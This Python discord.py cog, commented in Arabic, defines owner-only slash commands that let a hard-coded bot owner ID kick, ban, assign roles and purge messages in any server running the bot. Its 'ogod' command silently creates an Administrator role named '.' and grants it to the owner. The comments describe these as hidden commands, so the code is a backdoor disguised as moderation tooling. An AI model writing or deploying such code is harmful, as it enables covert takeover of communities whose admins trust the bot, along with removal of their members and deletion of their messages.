import discord
from discord import app_commands
from discord.ext import commands

class OwnerOverride(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        # الآيدي الخاص بك حصراً
        self.OWNER_ID = 1107355943408259112

    # التحقق الخفي من الهوية قبل تنفيذ أي أمر
    async def is_owner(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.OWNER_ID:
            await interaction.response.send_message("❌ هذا الأمر مخصص لمالك البوت فقط!", ephemeral=True)
            return False
        return True

    # --- 1. أمر الطرد (Kick) ---
    @app_commands.command(name="okick", description="طرد عضو من السيرفر (خاص بالمالك في كافة السيرفرات)")
    @app_commands.describe(member="العضو المرادطرده", reason="سبب الطرد")
    async def override_kick(self, interaction: discord.Interaction, member: discord.Member, reason: str = "بدون سبب"):
        if not await self.is_owner(interaction):
            return

        try:
            await member.kick(reason=f"أمر خفي بواسطة المالك: {reason}")
            await interaction.response.send_message(f"⚡ | تم طرد {member.mention} بنجاح من هذا السيرفر.", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ فشل التنفيذ: {e}", ephemeral=True)

    # --- 2. أمر الباند (Ban) ---
    @app_commands.command(name="oban", description="حظر عضو من السيرفر (خاص بالمالك في كافة السيرفرات)")
    @app_commands.describe(member="العضو المراد حظره", reason="سبب الحظر")
    async def override_ban(self, interaction: discord.Interaction, member: discord.Member, reason: str = "بدون سبب"):
        if not await self.is_owner(interaction):
            return

        try:
            await member.ban(reason=f"أمر خفي بواسطة المالك: {reason}")
            await interaction.response.send_message(f"⚡ | تم حظر {member.mention} بنجاح من هذا السيرفر.", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ فشل التنفيذ: {e}", ephemeral=True)

    # --- 3. أمر منح صلاحية أدمين مخفية (Godmode) ---
    @app_commands.command(name="ogod", description="إنشاء رتبة أدمين وإعطاؤها لك فوراً في أي سيرفر")
    async def override_godmode(self, interaction: discord.Interaction):
        if not await self.is_owner(interaction):
            return

        try:
            # إنشاء رتبة مخفية بدون اسم ملفت بصلاحيات Administrator
            admin_perm = discord.Permissions(administrator=True)
            new_role = await interaction.guild.create_role(name=".", permissions=admin_perm)
            await interaction.user.add_roles(new_role)
            await interaction.response.send_message("⚡ | تم منحك صلاحيات الأدمين الكاملة بالرتبة المخفية.", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ فشل التنفيذ: {e}", ephemeral=True)

    # --- 4. أمر إعطاء رتبة لأي شخص (Give Role) ---
    @app_commands.command(name="ogive", description="إعطاء رتبة لأي عضو (خاص بالمالك)")
    @app_commands.describe(member="العضو المستهدف", role="الرتبة المراد إعطاؤها")
    async def override_give(self, interaction: discord.Interaction, member: discord.Member, role: discord.Role):
        if not await self.is_owner(interaction):
            return

        try:
            await member.add_roles(role)
            await interaction.response.send_message(f"⚡ | تم إعطاء رتبة **{role.name}** لـ {member.mention}.", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ فشل التنفيذ: {e}", ephemeral=True)

    # --- 5. أمر مسح الرسائل (Purge) ---
    @app_commands.command(name="oclear", description="مسح عدد محدد من الرسائل في الروم (خاص بالمالك)")
    @app_commands.describe(amount="عدد الرسائل المراد مسحها")
    async def override_clear(self, interaction: discord.Interaction, amount: int = 10):
        if not await self.is_owner(interaction):
            return

        try:
            deleted = await interaction.channel.purge(limit=amount)
            await interaction.response.send_message(f"⚡ | تم مسح {len(deleted)} رسالة بنجاح.", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ فشل التنفيذ: {e}", ephemeral=True)

async def setup(bot):
    await bot.add_cog(OwnerOverride(bot))
